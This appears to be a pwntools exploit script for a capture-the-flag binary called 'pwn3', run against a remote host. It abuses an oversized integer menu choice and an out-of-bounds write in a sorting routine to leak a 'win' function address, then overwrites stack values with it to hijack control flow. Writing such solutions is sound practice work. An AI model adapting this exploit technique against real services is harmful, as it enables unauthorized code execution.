from pwn import *
context.binary = exe =ELF('./pwn3')


def GDB():
    gdb.attach(p,gdbscript='''
    p& cat_flag
    ''')
    input()
# p = process(exe.path)
# GDB()
# p = remote("0.0.0.0",1337)
p = remote("103.162.14.116",12003)
p.sendlineafter(b"Enter your choice:",f"{0x100000005}".encode())
p.sendlineafter(b"How many numbers do you want to sort? ",b"10")
for i in range(100):
    p.sendlineafter(b"Enter the element: ",b"0")
for i in range(5):
    p.sendlineafter(b"Enter the element: ",b"+")
# break out of the loop
p.sendlineafter(b"Enter the element: ",b"-1")
p.recvuntil(b"Sorted array: ")
for i in range(102):
    p.recvline()
win = int(p.recvline())
log.info('[+]WIN:'+hex(win))

p.sendlineafter(b"Enter your choice:",f"{0x100000005}".encode())
p.sendlineafter(b"How many numbers do you want to sort? ",b"10")
for i in range(100):
    p.sendlineafter(b"Enter the element: ",b"0")
for i in range(10):
    p.sendlineafter(b"Enter the element: ",f"{win}".encode())
# break out of the loop
p.sendlineafter(b"Enter the element: ",b"-1")   
p.sendlineafter(b"Enter your choice:",f"{5}".encode())

p.interactive()
